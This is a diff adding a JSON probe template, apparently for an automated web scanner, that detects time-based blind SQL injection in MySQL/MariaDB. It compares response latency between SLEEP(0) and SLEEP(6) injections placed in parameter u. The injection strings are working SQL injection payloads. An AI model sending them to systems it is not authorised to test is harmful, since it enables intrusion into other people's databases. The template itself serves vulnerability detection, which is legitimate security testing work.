@@ -1,0 +1,31 @@
+{
+  "name": "web/SQLi time-based blind MySQL-MariaDB",
+  "description": "[high] Proves time-based blind SQLi (MySQL/MariaDB): identical injections differing ONLY in (SELECT SLEEP(0)) vs (SELECT SLEEP(6)); latency_delta >= 3.5s isolates DB execution from network noise (MySQL dialect, complements the existing pg_sleep skill). Keywords: sqli blind time-based mysql mariadb sleep injection. ctrl: benign/no-injection request stays fast -> not falsified. probe_url = endpoint WITHOUT query string; injection rides param u.",
+  "cwe": "CWE-89",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{probe_url}}?u=admin%27%20AND%20(SELECT%20SLEEP(0))--%20-"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{probe_url}}?u=admin%27%20AND%20(SELECT%20SLEEP(6))--%20-"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 3.5
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "06d6ab91f6ac",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
